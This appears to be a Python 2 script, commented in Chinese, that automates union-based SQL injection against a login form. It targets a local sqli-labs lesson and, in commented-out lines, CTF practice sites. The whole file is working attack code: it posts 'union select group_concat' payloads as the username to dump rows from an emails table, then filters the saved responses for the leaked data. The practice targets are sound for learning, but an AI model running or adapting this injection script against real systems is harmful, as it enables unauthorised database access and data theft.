# -*- coding: utf-8 -*-
import urllib2
import urllib
from urllib import quote
#脚本应用于get请求单框注入情况下
#定义一个url
import time

#url='http://ctf5.shiyanbar.com/423/web/?id='; #简单sql注入1
# url='http://ctf5.shiyanbar.com/web/index_3.php?id=' #简单sql注入2
url='http://localhost/sqli-labs/Less-11/' #lesson 11
table='emails'
column1='id'
column2='email_id'
keyword='Login name:'
f = file("result.txt", "w+")
for i in range(1,10):
    payload_table_from_tab="-1' union select 1,group_concat("+column1+","+column2+") from "+table+" where "+column1+"="+str(i)+" " #从information_schema.tables中获取数据库所有表名
    payload_end = '-- #/*'
    username = payload_table_from_tab + payload_end
    password = '*/-- #'
    requesturl=url + quote(payload_table_from_tab)+payload_end
    try:
        # 定义要提交的数据
        postdata = dict(uname=username, passwd=password)
        # url编码
        postdata = urllib.urlencode(postdata)
        # enable cookie
        req = urllib2.Request(url, postdata)
        res = urllib2.urlopen(req, data=None, timeout=2)
        text = res.read()
    except Exception ,e:
        print "Error: "+e
    if(text.find('error')<0):
        #print text
        f.writelines(text)
    else:
        break
f.close()
filename="result.txt"
for line in open(filename):
     if(line.find(keyword)>0):
        print line.split('\n')